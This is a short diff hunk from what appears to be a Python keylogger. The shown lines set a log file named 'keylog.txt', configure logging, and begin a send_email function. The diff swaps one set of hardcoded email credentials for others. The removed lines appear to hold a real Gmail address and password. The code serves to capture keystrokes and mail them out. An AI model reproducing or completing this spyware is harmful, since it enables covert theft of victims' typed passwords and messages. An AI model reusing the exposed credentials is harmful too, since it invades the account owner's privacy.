@@ -8,9 +8,9 @@ log_file= "keylog.txt"
 logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 #Email cred
-EMAIL_ADDRESS = "canyouguessitnullbyte@gmail.com"
-EMAIL_PASSWORD = "henryferrari0803"
-TO_EMAIL = "canyouguessitnullbyte@gmail.com"
+EMAIL_ADDRESS = "Billgates676767"
+EMAIL_PASSWORD = "Gamer9000"
+TO_EMAIL = "Billgates676767"
 
 def send_email():
 try:
